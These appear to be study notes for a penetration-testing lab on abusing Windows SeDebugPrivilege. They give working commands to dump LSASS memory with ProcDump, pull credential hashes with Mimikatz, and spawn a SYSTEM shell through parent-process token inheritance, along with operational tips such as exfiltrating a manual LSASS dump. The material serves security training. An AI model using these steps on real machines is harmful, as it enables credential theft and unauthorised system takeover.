# SeDebugPrivilege

## ID
701

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 8 — SeDebugPrivilege

## Description
Abuse SeDebugPrivilege to dump LSASS process memory with ProcDump, extract credential hashes with Mimikatz, and optionally escalate to SYSTEM via parent process token inheritance.

## Tags
sedebugprivilege, lsass, mimikatz, procdump, credential-dumping, windows

## Commands
- `whoami /priv`
- `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
- `mimikatz.exe`
- `sekurlsa::minidump lsass.dmp`
- `sekurlsa::logonpasswords`
- `tasklist` (to find SYSTEM PID for RCE method)

## What This Section Covers
SeDebugPrivilege allows a user to debug any process, which means they can read/write memory of any process including LSASS. This enables credential dumping (NTLM hashes, Kerberos tickets) from LSASS memory and privilege escalation to SYSTEM by inheriting a SYSTEM process token. Developers and troubleshooting accounts are often granted this right via Group Policy.

## Methodology
1. RDP into the target and open an **elevated** command prompt (Run as admin with your user creds).
2. Run `whoami /priv` to confirm `SeDebugPrivilege` is present.
3. Use `procdump.exe -accepteula -ma lsass.exe lsass.dmp` to dump LSASS memory.
4. Launch `mimikatz.exe`, type `log` to capture output, then `sekurlsa::minidump lsass.dmp` followed by `sekurlsa::logonpasswords`.
5. Extract NTLM hashes from the output — look for the target account name and its NTLM value.
6. (Alternative) For SYSTEM shell: run `tasklist`, find a SYSTEM process PID (e.g. `winlogon.exe`), and use the `psgetsystem` PoC script: `[MyProcess]::CreateProcessFromParent(<PID>,"cmd.exe","")`.

## Multi-step Workflow
```
# Method 1 — Credential dumping
whoami /priv
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
  log
  sekurlsa::minidump lsass.dmp
  sekurlsa::logonpasswords

# Method 2 — SYSTEM shell via parent PID
tasklist                        # find winlogon.exe PID
powershell -ep bypass
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(<WINLOGON_PID>,"cmd.exe","")
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — NTLM hash for sccm_svc | (submit from your Mimikatz output) | ProcDump LSASS → Mimikatz `sekurlsa::logonpasswords` → sccm_svc NTLM field |

## Key Takeaways
- SeDebugPrivilege is commonly assigned to developers and troubleshooting accounts — target these users during hash cracking (e.g. from Responder/Inveigh captures).
- Always type `log` in Mimikatz before running commands — output goes to `mimikatz.log` so you don't lose creds in scroll-back.
- Two attack paths from SeDebugPrivilege: (1) dump LSASS for creds, (2) spawn a SYSTEM shell via parent process token inheritance.
- If you can't upload tools, you can create an LSASS dump manually via **Task Manager → Details → lsass.exe → Create dump file**, then exfil and process offline.
- BloodHound cannot enumerate SeDebugPrivilege remotely — you only discover it after landing on the host and running `whoami /priv`.

## Gotchas
- The command prompt **must be elevated** (Run as administrator) or SeDebugPrivilege won't appear even if the user has it assigned.
- ProcDump needs `-accepteula` on first run or it hangs waiting for EULA acceptance.
- The `psgetsystem` PoC requires a third blank argument `""` or it fails silently — syntax is `CreateProcessFromParent(<PID>,"cmd.exe","")`.
- If LSASS dump yields no useful creds, pivot to the SYSTEM shell method — the machine NTLM hash alone can still be useful.
